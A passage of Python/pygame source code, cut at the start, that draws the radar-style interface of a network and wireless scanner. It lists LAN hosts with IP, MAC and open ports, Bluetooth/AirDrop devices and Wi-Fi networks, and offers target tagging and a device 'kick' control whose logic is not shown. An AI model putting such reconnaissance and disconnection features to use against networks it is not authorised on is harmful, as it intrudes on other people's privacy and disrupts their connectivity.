            glow_a = int(30 + 55 * pulse)
            pygame.draw.circle(glow, (*glow_color, glow_a), (glow_r, glow_r), glow_r)
            self.screen.blit(glow, (pos[0] - glow_r, pos[1] - glow_r))

            for arc_i in range(3):
                arc_r = size + 2 + arc_i * 4
                rect = pygame.Rect(pos[0] - arc_r, pos[1] - arc_r, arc_r * 2, arc_r * 2)
                pygame.draw.arc(self.screen, base_color, rect, 0.3, 1.25, 2)
            pygame.draw.circle(self.screen, base_color, pos, size - 1)

            default_name = net.display_name[:18]
            label_text = self._get_display_name(bssid, default_name)
            if net.is_open:
                label_text += " [OPEN]"
            if custom_color:
                label_color = custom_color
            elif net.is_open:
                label_color = RED
            else:
                label_color = BRIGHT_PURPLE if pulse > 0 else PURPLE
            label = self.font_small.render(label_text, True, label_color)
            self.screen.blit(label, (pos[0] + 14, pos[1] - 6))

            sig_text = self.font_tiny.render(f"{net.signal}% ch{net.channel}", True, custom_color or DIM_PURPLE)
            self.screen.blit(sig_text, (pos[0] + 14, pos[1] + 8))
            strength = max(0, min(4, net.signal // 25))
            bar_x = pos[0] + 14 + sig_text.get_width() + 4
            bar_y = pos[1] + 10
            for b in range(4):
                h = 3 + b * 2
                c = base_color if b < strength else (30, 30, 30)
                pygame.draw.rect(self.screen, c, (bar_x + b * 5, bar_y + (10 - h), 3, h))

            note = self.device_notes.get(bssid)
            if note:
                note_surf = self.font_tiny.render(f'"{note[:20]}"', True, DIM_AMBER)
                self.screen.blit(note_surf, (pos[0] + 14, pos[1] + 34))

            is_new = (now - net.first_seen) < 30
            if is_new and int(now * 3) % 2 == 0:
                new_surf = self.font_tiny.render("NEW", True, BRIGHT_PURPLE)
                bg = pygame.Surface((new_surf.get_width() + 4, new_surf.get_height() + 2), pygame.SRCALPHA)
                bg.fill((40, 10, 60, 180))
                self.screen.blit(bg, (pos[0] - 20, pos[1] - 16))
                self.screen.blit(new_surf, (pos[0] - 18, pos[1] - 15))

    def _draw_connection_line(self):
        if self.selected_id is None:
            return

        dev = None
        if self.selected_type == "net" and self.selected_id in self.scanner.devices:
            dev = self.scanner.devices[self.selected_id]
        elif self.selected_type == "bt" and self.selected_id in self.bt_scanner.devices:
            dev = self.bt_scanner.devices[self.selected_id]
        elif self.selected_type == "wifi" and self.selected_id in self.wifi_scanner.networks:
            dev = self.wifi_scanner.networks[self.selected_id]
        if dev is None:
            return

        pos = self._get_radar_pos(self.selected_id, dev)
        dx = pos[0] - RADAR_CENTER[0]
        dy = pos[1] - RADAR_CENTER[1]
        dist = math.sqrt(dx * dx + dy * dy)
        if dist < 5:
            return

        custom_color = self.device_colors.get(self.selected_id)
        if custom_color:
            color = custom_color
        elif self.selected_type == "bt":
            color = CYAN
        elif self.selected_type == "wifi":
            color = PURPLE
        else:
            color = BRIGHT_GREEN
        now = time.time()
        num_dashes = int(dist / 10)
        for i in range(num_dashes):
            frac = i / num_dashes
            offset = (now * 3) % 1.0
            frac_shifted = (frac + offset) % 1.0
            if int(frac_shifted * num_dashes) % 2 == 0:
                continue
            sx = int(RADAR_CENTER[0] + dx * (i / num_dashes))
            sy = int(RADAR_CENTER[1] + dy * (i / num_dashes))
            ex = int(RADAR_CENTER[0] + dx * ((i + 1) / num_dashes))
            ey = int(RADAR_CENTER[1] + dy * ((i + 1) / num_dashes))
            line_surf = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
            pygame.draw.line(line_surf, (*color, 80), (sx, sy), (ex, ey), 1)
            self.screen.blit(line_surf, (0, 0))

        dist_pct = int(dev.distance * 100)
        dist_label = self.font_tiny.render(f"{dist_pct}%", True, color)
        mid_x = (RADAR_CENTER[0] + pos[0]) // 2
        mid_y = (RADAR_CENTER[1] + pos[1]) // 2
        self.screen.blit(dist_label, (mid_x + 5, mid_y - 5))

    def _draw_hover_tooltip(self):
        if self.hover_id is None or self.hover_id == self.selected_id:
            return

        mouse_pos = pygame.mouse.get_pos()
        lines = []

        if self.hover_type == "net" and self.hover_id in self.scanner.devices:
            dev = self.scanner.devices[self.hover_id]
            lines.append(dev.hostname or dev.ip)
            lines.append(f"IP: {dev.ip}")
            lines.append(f"MAC: {dev.mac}")
            vendor = dev.vendor
            if vendor:
                lines.append(f"Vendor: {vendor}")
            dtype = dev.device_type
            if dtype:
                lines.append(f"Type: {dtype}")
            ps = self.port_scan_results.get(self.hover_id)
            if ps and ps["status"] == "done" and ps["ports"]:
                ports = ", ".join(str(p) for p, _ in ps["ports"][:4])
                lines.append(f"Ports: {ports}")
        elif self.hover_type == "bt" and self.hover_id in self.bt_scanner.devices:
            dev = self.bt_scanner.devices[self.hover_id]
            lines.append(dev.display_name)
            lines.append(f"RSSI: {dev.rssi}dBm" if dev.rssi else "RSSI: N/A")
            if dev.apple_services:
                lines.append(f"Apple: {', '.join(dev.apple_services[:2])}")
        elif self.hover_type == "wifi" and self.hover_id in self.wifi_scanner.networks:
            net = self.wifi_scanner.networks[self.hover_id]
            lines.append(net.display_name)
            sec = "OPEN" if net.is_open else net.auth
            lines.append(f"Auth: {sec}")
            lines.append(f"Signal: {net.signal}%  Ch: {net.channel}")
            if net.band:
                lines.append(f"Band: {net.band}")
            vendor = net.vendor
            if vendor:
                lines.append(f"Vendor: {vendor}")
        else:
            return

        tag = self.tagged_devices.get(self.hover_id)
        if tag:
            lines.append(f"Tag: {tag}")

        max_w = max(self.font_tiny.size(l)[0] for l in lines) + 16
        tip_h = len(lines) * 14 + 8
        tip_x = mouse_pos[0] + 15
        tip_y = mouse_pos[1] - tip_h // 2
        tip_x = min(tip_x, SCREEN_W - max_w - 5)
        tip_y = max(5, min(tip_y, SCREEN_H - tip_h - 5))

        tip_surf = pygame.Surface((max_w, tip_h), pygame.SRCALPHA)
        tip_surf.fill((0, 10, 0, 210))
        pygame.draw.rect(tip_surf, ACCENT_GREEN, (0, 0, max_w, tip_h), 1)
        self.screen.blit(tip_surf, (tip_x, tip_y))

        for i, line in enumerate(lines):
            color = BRIGHT_GREEN if i == 0 else DIM_GREEN
            text = self.font_tiny.render(line, True, color)
            self.screen.blit(text, (tip_x + 6, tip_y + 4 + i * 14))

    def _draw_export_flash(self):
        if self.export_flash == 0:
            return
        age = time.time() - self.export_flash
        if age > 2.0:
            self.export_flash = 0
            return
        alpha = int(255 * max(0, 1.0 - age / 2.0))
        flash = self.font_med.render("REPORT SAVED: device_scan_report.txt", True, BRIGHT_GREEN)
        flash_bg = pygame.Surface((flash.get_width() + 20, flash.get_height() + 10), pygame.SRCALPHA)
        flash_bg.fill((0, 40, 0, min(200, alpha)))
        x = SCREEN_W // 2 - flash_bg.get_width() // 2
        y = SCREEN_H // 2 + RADAR_RADIUS + 20
        self.screen.blit(flash_bg, (x, y))
        flash.set_alpha(alpha)
        self.screen.blit(flash, (x + 10, y + 5))

    def _draw_event_log(self):
        visible = self.event_log[-8:]
        if not visible:
            return
        log_w = 260
        log_h = 16 + len(visible) * 13
        log_x = 10
        log_y = SCREEN_H - 48 - log_h

        if self.selected_id is not None:
            log_y -= 180

        log_surf = pygame.Surface((log_w, log_h), pygame.SRCALPHA)
        log_surf.fill((0, 5, 0, 150))
        pygame.draw.rect(log_surf, (0, 40, 0, 100), (0, 0, log_w, log_h), 1)
        self.screen.blit(log_surf, (log_x, log_y))

        header = self.font_tiny.render("EVENT LOG", True, DIM_GREEN)
        self.screen.blit(header, (log_x + 4, log_y + 2))

        for i, (ts, msg) in enumerate(visible):
            y = log_y + 14 + i * 13
            age = len(visible) - i
            alpha_frac = max(0.4, 1.0 - age * 0.08)
            g = int(120 * alpha_frac)
            text = self.font_tiny.render(f"{ts} {msg[:30]}", True, (0, g, 0))
            self.screen.blit(text, (log_x + 4, y))

    def _draw_alerts(self):
        now = time.time()
        self.alert_queue = [a for a in self.alert_queue if now - a[2] < 4.0]

        for i, (title, msg, t, color) in enumerate(self.alert_queue[-3:]):
            age = now - t
            alpha = max(0, min(255, int(255 * (1.0 - age / 4.0))))
            y_offset = int(age * 15)

            alert_w = 300
            alert_h = 30
            ax = SCREEN_W // 2 - alert_w // 2
            ay = 100 + i * 36 - y_offset

            alert_surf = pygame.Surface((alert_w, alert_h), pygame.SRCALPHA)
            alert_surf.fill((0, 0, 0, min(180, alpha)))
            pygame.draw.rect(alert_surf, (*color, min(200, alpha)), (0, 0, alert_w, alert_h), 1)
            pygame.draw.rect(alert_surf, (*color, min(100, alpha)), (0, 0, 4, alert_h))
            self.screen.blit(alert_surf, (ax, ay))

            title_surf = self.font_tiny.render(title, True, color)
            title_surf.set_alpha(alpha)
            self.screen.blit(title_surf, (ax + 10, ay + 3))

            msg_surf = self.font_tiny.render(msg[:35], True, WHITE)
            msg_surf.set_alpha(alpha)
            self.screen.blit(msg_surf, (ax + 10, ay + 16))

    def _draw_crosshair(self):
        cx, cy = RADAR_CENTER
        gap, length = 8, 22
        for dx, dy in [(1, 0), (-1, 0), (0, 1), (0, -1)]:
            sx, sy = cx + dx * gap, cy + dy * gap
            ex, ey = cx + dx * (gap + length), cy + dy * (gap + length)
            ch_surf = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
            pygame.draw.line(ch_surf, (0, 100, 0, 150), (sx, sy), (ex, ey), 1)
            self.screen.blit(ch_surf, (0, 0))
        pulse = 0.5 + 0.5 * math.sin(time.time() * 3)
        center_dot = pygame.Surface((8, 8), pygame.SRCALPHA)
        pygame.draw.circle(center_dot, (0, 255, 0, int(40 + 40 * pulse)), (4, 4), 4)
        pygame.draw.circle(center_dot, (0, 200, 0, int(80 + 60 * pulse)), (4, 4), 2)
        self.screen.blit(center_dot, (cx - 4, cy - 4))

    def _draw_selected_panel(self):
        if self.selected_id is None:
            return

        lines = []
        if self.selected_type == "net" and self.selected_id in self.scanner.devices:
            dev = self.scanner.devices[self.selected_id]
            lines.append(("TYPE", "NETWORK DEVICE", GREEN))
            lines.append(("IP", dev.ip, WHITE))
            lines.append(("MAC", dev.mac, WHITE))
            vendor = dev.vendor
            if vendor:
                lines.append(("VENDOR", vendor, AMBER))
            lines.append(("HOST", dev.hostname or "unknown", WHITE))
            dtype = dev.device_type
            if dtype:
                lines.append(("CLASS", dtype, ACCENT_GREEN))
            age = int(time.time() - dev.last_seen)
            first = int(time.time() - dev.first_seen)
            lines.append(("SEEN", f"{age}s ago (first: {first}s)", DIM_GREEN))
            if dev.is_self:
                lines.append(("NOTE", "THIS IS YOU", AMBER))
            if self.selected_id in self.kicked_devices:
                lines.append(("STATUS", "BLOCKED / KICKED", RED))
            ps = self.port_scan_results.get(self.selected_id)
            if ps:
                if ps["status"] == "scanning":
                    lines.append(("PORTS", "Scanning...", AMBER))
                elif ps["ports"]:
                    for port, name in ps["ports"][:5]:
                        lines.append(("PORT", f"{port} ({name})", ORANGE))
                else:
                    lines.append(("PORTS", "None open", DIM_GREEN))
        elif self.selected_type == "bt" and self.selected_id in self.bt_scanner.devices:
            dev = self.bt_scanner.devices[self.selected_id]
            lines.append(("TYPE", "BLUETOOTH (BLE)", CYAN))
            lines.append(("ADDR", dev.address, WHITE))
            lines.append(("NAME", dev.name or "unknown", WHITE))
            lines.append(("RSSI", f"{dev.rssi} dBm" if dev.rssi else "N/A", WHITE))
            if dev.apple_services:
                lines.append(("APPLE", ", ".join(dev.apple_services), APPLE_BLUE))
            if dev.has_airdrop:
                lines.append(("AIRDROP", "ACTIVE", BRIGHT_CYAN))
            age = int(time.time() - dev.last_seen)
            first = int(time.time() - dev.first_seen)
            lines.append(("SEEN", f"{age}s ago (first: {first}s)", DIM_CYAN))
            if dev.rssi:
                strength = max(0, min(100, 100 + dev.rssi))
                lines.append(("SIGNAL", f"{strength}%", CYAN))
        elif self.selected_type == "wifi" and self.selected_id in self.wifi_scanner.networks:
            net = self.wifi_scanner.networks[self.selected_id]
            lines.append(("TYPE", "WIFI NETWORK", PURPLE))
            lines.append(("SSID", net.display_name, WHITE))
            lines.append(("BSSID", net.bssid, WHITE))
            vendor = net.vendor
            if vendor:
                lines.append(("VENDOR", vendor, AMBER))
            lines.append(("AUTH", net.auth or "Open", RED if net.is_open else WHITE))
            lines.append(("ENCRYPT", net.encryption or "None", WHITE))
            lines.append(("CHANNEL", str(net.channel), WHITE))
            if net.band:
                lines.append(("BAND", net.band, WHITE))
            if net.radio_type:
                lines.append(("RADIO", net.radio_type, WHITE))
            lines.append(("SIGNAL", f"{net.signal}%", BRIGHT_PURPLE))
            age = int(time.time() - net.last_seen)
            first = int(time.time() - net.first_seen)
            lines.append(("SEEN", f"{age}s ago (first: {first}s)", DIM_PURPLE))
            if net.is_open:
                lines.append(("ALERT", "OPEN NETWORK - NO ENCRYPTION", RED))
        else:
            self.selected_id = None
            self.selected_type = None
            return

        tag = self.tagged_devices.get(self.selected_id)
        if tag:
            tc = {"KNOWN": GREEN, "SUSPECT": AMBER, "TARGET": RED}.get(tag, WHITE)
            lines.append(("TAG", tag, tc))

        alias = self.device_aliases.get(self.selected_id)
        if alias:
            lines.append(("ALIAS", alias, BRIGHT_GREEN))

        note = self.device_notes.get(self.selected_id)
        if note:
            lines.append(("NOTE", note[:25], DIM_AMBER))

        custom_color = self.device_colors.get(self.selected_id)
        if custom_color:
            color_name = "Custom"
            for cn, cv in COLOR_PRESETS:
                if cv == custom_color:
                    color_name = cn
                    break
            lines.append(("COLOR", color_name, custom_color))

        if self.selected_id in self.device_custom_pos:
            lines.append(("POS", "Custom (Shift+drag)", DIM_GREEN))

        panel_w = 290
        panel_h = 52 + len(lines) * 20
        panel_x = 15
        panel_y = SCREEN_H - 65 - panel_h

        draw_panel(self.screen, panel_x, panel_y, panel_w, panel_h, border_color=ACCENT_GREEN)

        header = self.font_small.render("SELECTED DEVICE", True, BRIGHT_GREEN)
        self.screen.blit(header, (panel_x + 10, panel_y + 8))
        pygame.draw.line(self.screen, PANEL_BORDER, (panel_x + 8, panel_y + 24),
                         (panel_x + panel_w - 8, panel_y + 24), 1)

        for i, (key, val, color) in enumerate(lines):
            y = panel_y + 30 + i * 20
            key_surf = self.font_small.render(f"{key}:", True, DIM_GREEN)
            val_surf = self.font_small.render(f" {val}", True, color)
            self.screen.blit(key_surf, (panel_x + 12, y))
            self.screen.blit(val_surf, (panel_x + 60, y))

        hint1 = self.font_tiny.render("[X]Del [T]Tag [F2]Name [N]Note [K]Kick", True, (0, 50, 0))
        hint2 = self.font_tiny.render("[F3]Color [F4]CTag [Shift+Drag]Move", True, (0, 50, 0))
        self.screen.blit(hint1, (panel_x + 12, panel_y + panel_h - 26))
        self.screen.blit(hint2, (panel_x + 12, panel_y + panel_h - 14))

    def _draw_text_input(self):
        overlay = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 140))
        self.screen.blit(overlay, (0, 0))

        box_w, box_h = 400, 80
        box_x = SCREEN_W // 2 - box_w // 2
        box_y = SCREEN_H // 2 - box_h // 2

        draw_panel(self.screen, box_x, box_y, box_w, box_h, border_color=BRIGHT_GREEN)

        prompt = self.font_med.render(self.text_input_prompt, True, BRIGHT_GREEN)
        self.screen.blit(prompt, (box_x + 15, box_y + 12))

        cursor = "_" if int(time.time() * 3) % 2 == 0 else ""
        input_text = self.font_hud.render(self.text_input_buffer + cursor, True, WHITE)
        self.screen.blit(input_text, (box_x + 15, box_y + 38))

        hint = self.font_tiny.render("[ENTER] Confirm   [ESC] Cancel", True, DIM_GREEN)
        self.screen.blit(hint, (box_x + 15, box_y + 62))

    def _draw_drag_indicator(self):
        mouse_pos = pygame.mouse.get_pos()
        drag_surf = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
        pygame.draw.line(drag_surf, (255, 255, 0, 100), RADAR_CENTER, mouse_pos, 1)
        self.screen.blit(drag_surf, (0, 0))
        label = self.font_tiny.render("DRAG TO MOVE", True, YELLOW)
        self.screen.blit(label, (mouse_pos[0] + 10, mouse_pos[1] - 10))

    def _draw_hud(self):
        elapsed = time.time() - self.start_time
        now = time.time()
        blink = int(elapsed * 2) % 2 == 0

        # ─── TOP-LEFT: TITLE ─────────────────────────────────────────────
        draw_panel(self.screen, 10, 10, 260, 82)

        title = self.font_title.render("UAV ONLINE", True, BRIGHT_GREEN)
        glow_title = self.font_title.render("UAV ONLINE", True, (0, 100, 0))
        self.screen.blit(glow_title, (22, 18))
        self.screen.blit(title, (20, 16))

        sub = self.font_med.render("NETWORK SWEEP ACTIVE", True, DIM_GREEN)
        self.screen.blit(sub, (20, 52))

        if self.scanner.scanning and blink:
            scan_text = self.font_small.render("[ SCANNING... ]", True, AMBER)
            self.screen.blit(scan_text, (20, 72))
        elif not self.scanner.scanning:
            next_scan = max(0, int(SCAN_INTERVAL - (now - self.scanner.last_scan)))
            progress = 1.0 - next_scan / SCAN_INTERVAL
            draw_progress_bar(self.screen, 20, 76, 120, 6, progress, DIM_GREEN)
            t = self.font_tiny.render(f"NEXT: {next_scan}s", True, (0, 50, 0))
            self.screen.blit(t, (145, 73))

        # ─── TOP-RIGHT: STATUS ───────────────────────────────────────────
        status_w = 290
        status_x = SCREEN_W - status_w - 10
        draw_panel(self.screen, status_x, 10, status_w, 148)

        device_count = len([m for m in self.scanner.devices if m not in self.hidden_devices])
        bt_count = len([a for a in self.bt_scanner.devices if a not in self.hidden_devices])
        bt_apple = sum(1 for d in self.bt_scanner.devices.values() if d.is_apple)
        bt_airdrop = sum(1 for d in self.bt_scanner.devices.values() if d.has_airdrop)

        ip_text = self.font_med.render(f"IP: {self.scanner.my_ip}", True, AMBER)
        self.screen.blit(ip_text, (status_x + 12, 18))

        subnet = self.font_tiny.render(f"SUBNET: {self.scanner.subnet}.0/24", True, DIM_GREEN)
        self.screen.blit(subnet, (status_x + 12, 36))

        count_color = BRIGHT_GREEN if device_count > 0 else DIM_RED
        ct = self.font_hud.render(f"NET CONTACTS: {device_count}", True, count_color)
        self.screen.blit(ct, (status_x + 12, 54))

        bt_color = CYAN if bt_count > 0 else DIM_CYAN
        bt_text = f"BT: {bt_count}"
        if bt_apple > 0:
            bt_text += f"  APPLE: {bt_apple}"
        if bt_airdrop > 0:
            bt_text += f"  AD: {bt_airdrop}"
        bt = self.font_med.render(bt_text, True, bt_color)
        self.screen.blit(bt, (status_x + 12, 78))

        wifi_count = len([b for b in self.wifi_scanner.networks if b not in self.hidden_devices])
        wifi_open = sum(1 for n in self.wifi_scanner.networks.values() if n.is_open)
        wifi_color = PURPLE if wifi_count > 0 else DIM_PURPLE
        wifi_text = f"WIFI: {wifi_count}"
        if wifi_open > 0:
            wifi_text += f"  OPEN: {wifi_open}"
        wf = self.font_med.render(wifi_text, True, wifi_color)
        self.screen.blit(wf, (status_x + 12, 94))

        if not self.bt_scanner.enabled:
            nb = self.font_tiny.render("(bleak not installed)", True, DIM_RED)
            self.screen.blit(nb, (status_x + 12, 112))
        elif self.bt_scanner.scanning and blink:
            bs = self.font_tiny.render("[ BT SCANNING... ]", True, CYAN)
            self.screen.blit(bs, (status_x + 12, 112))

        uptime = int(time.time() - self.start_time)
        mins, secs = divmod(uptime, 60)
        hrs, mins = divmod(mins, 60)
        stats = self.font_tiny.render(
            f"UP: {hrs:02d}:{mins:02d}:{secs:02d}  TOTAL: {self.total_devices_ever}  SCANS: {self.scan_count}",
            True, DIM_GREEN,
        )
        self.screen.blit(stats, (status_x + 12, 130))

        # ─── RIGHT PANEL: DEVICE LIST ────────────────────────────────────
        panel_x = SCREEN_W - 300
        panel_y = 148
        panel_w = 285

        net_items = [(m, d) for m, d in self.scanner.devices.items() if m not in self.hidden_devices]
        net_visible = net_items[:10]

        if net_visible:
            panel_h = 28 + len(net_visible) * 20
            draw_panel(self.screen, panel_x, panel_y, panel_w, panel_h)

            header = self.font_small.render("DETECTED DEVICES", True, ACCENT_GREEN)
            self.screen.blit(header, (panel_x + 10, panel_y + 6))
            pygame.draw.line(self.screen, PANEL_BORDER, (panel_x + 8, panel_y + 22),
                             (panel_x + panel_w - 8, panel_y + 22), 1)

            for i, (mac, dev) in enumerate(net_visible):
                y = panel_y + 26 + i * 20
                custom_c = self.device_colors.get(mac)
                if dev.is_self:
                    color, tag = custom_c or AMBER, " [YOU]"
                else:
                    vendor = dev.vendor
                    color = custom_c or GREEN
                    tag = f" [{vendor[:6]}]" if vendor else ""
                default_name = dev.hostname[:12] if dev.hostname else "unknown"
                name = self._get_display_name(mac, default_name)
                text = f"{dev.ip:15s} {name}{tag}"
                line = self.font_small.render(text, True, color)
                self.screen.blit(line, (panel_x + 10, y))

            if len(net_items) > 10:
                more = self.font_tiny.render(f"+{len(net_items) - 10} more", True, DIM_GREEN)
                self.screen.blit(more, (panel_x + 10, panel_y + panel_h - 14))
            panel_y += panel_h + 6
        else:
            panel_h = 0

        if self.show_bt:
            bt_items = [(a, d) for a, d in self.bt_scanner.devices.items() if a not in self.hidden_devices]
            bt_vis = bt_items[:8]
            if bt_vis:
                bt_h = 28 + len(bt_vis) * 20
                draw_panel(self.screen, panel_x, panel_y, panel_w, bt_h, border_color=DIM_CYAN)

                bt_hdr = self.font_small.render("BLUETOOTH / AIRDROP", True, CYAN)
                self.screen.blit(bt_hdr, (panel_x + 10, panel_y + 6))
                pygame.draw.line(self.screen, DIM_CYAN, (panel_x + 8, panel_y + 22),
                                 (panel_x + panel_w - 8, panel_y + 22), 1)

                for i, (addr, dev) in enumerate(bt_vis):
                    y = panel_y + 26 + i * 20
                    custom_c = self.device_colors.get(addr)
                    if dev.has_airdrop:
                        color, tag = custom_c or APPLE_BLUE, " [AD]"
                    elif dev.is_apple:
                        color, tag = custom_c or CYAN, " [" + dev.apple_services[0][:5] + "]"
                    else:
                        color, tag = custom_c or DIM_CYAN, ""
                    default_name = dev.display_name[:12]
                    name = self._get_display_name(addr, default_name)
                    rssi_str = f"{dev.rssi}dB" if dev.rssi else ""
                    text = f"{name:12s} {rssi_str:>6s}{tag}"
                    line = self.font_small.render(text, True, color)
                    self.screen.blit(line, (panel_x + 10, y))

                if len(bt_items) > 8:
                    more = self.font_tiny.render(f"+{len(bt_items) - 8} more", True, DIM_CYAN)
                    self.screen.blit(more, (panel_x + 10, panel_y + bt_h - 14))
                panel_y += bt_h + 6

        if self.show_wifi:
            wifi_items = [(b, n) for b, n in self.wifi_scanner.networks.items() if b not in self.hidden_devices]
            wifi_vis = wifi_items[:6]
            if wifi_vis:
                wifi_h = 28 + len(wifi_vis) * 20
                draw_panel(self.screen, panel_x, panel_y, panel_w, wifi_h, border_color=DIM_PURPLE)

                wifi_hdr = self.font_small.render("WIFI NETWORKS", True, PURPLE)
                self.screen.blit(wifi_hdr, (panel_x + 10, panel_y + 6))
                pygame.draw.line(self.screen, DIM_PURPLE, (panel_x + 8, panel_y + 22),
                                 (panel_x + panel_w - 8, panel_y + 22), 1)

                for i, (bssid, net) in enumerate(wifi_vis):
                    y = panel_y + 26 + i * 20
                    custom_c = self.device_colors.get(bssid)
                    if net.is_open:
                        color, tag = custom_c or RED, " [OPEN]"
                    elif net.security_level >= 3:
                        color, tag = custom_c or BRIGHT_PURPLE, " [WPA3]"
                    elif net.security_level >= 2:
                        color, tag = custom_c or PURPLE, " [WPA2]"
                    else:
                        color, tag = custom_c or DIM_PURPLE, " [WPA]"
                    default_name = net.display_name[:12]
                    name = self._get_display_name(bssid, default_name)
                    text = f"{name:12s} {net.signal:>3d}%{tag}"
                    line = self.font_small.render(text, True, color)
                    self.screen.blit(line, (panel_x + 10, y))

                if len(wifi_items) > 6:
                    more = self.font_tiny.render(f"+{len(wifi_items) - 6} more", True, DIM_PURPLE)
                    self.screen.blit(more, (panel_x + 10, panel_y + wifi_h - 14))

        # ─── BOTTOM BAR ──────────────────────────────────────────────────
        bar_y = SCREEN_H - 38
        draw_panel(self.screen, 10, bar_y, SCREEN_W - 20, 28)

        bt_s = "ON" if self.show_bt else "OFF"
        wifi_s = "ON" if self.show_wifi else "OFF"
        hidden = len(self.hidden_devices)
        hidden_str = f" H:{hidden}" if hidden > 0 else ""
        controls = self.font_small.render(
            f"[R]Scan [B]T:{bt_s} [W]iFi:{wifi_s} [T]ag [X]Del [K]ick [P]ort [S]ave [F2]Name{hidden_str}",
            True, BRIGHT_GREEN,
        )
        self.screen.blit(controls, (22, bar_y + 7))

        time_str = time.strftime("%H:%M:%S")
        clock = self.font_med.render(time_str, True, BRIGHT_GREEN)
        self.screen.blit(clock, (SCREEN_W - 110, bar_y + 5))


if __name__ == "__main__":
    radar = UAVRadar()
    radar.run()
